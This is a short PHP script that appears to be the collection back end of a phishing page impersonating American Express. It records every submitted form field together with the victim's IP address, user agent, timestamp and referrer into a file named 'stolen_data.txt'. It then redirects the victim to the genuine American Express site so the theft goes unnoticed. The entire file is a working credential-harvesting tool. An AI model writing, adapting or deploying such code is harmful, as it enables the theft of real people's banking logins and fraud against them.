<?php
date_default_timezone_set('UTC');
$log_file = 'stolen_data.txt';
$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$data['timestamp'] = date('Y-m-d H:i:s');
$data['referer'] = $_SERVER['HTTP_REFERER'] ?? 'direct';

file_put_contents($log_file, json_encode($data, JSON_PRETTY_PRINT) . "\n\n", FILE_APPEND | LOCK_EX);

header('Location: https://www.americanexpress.com/us/online/'); // Redirect to real site
exit();
?>
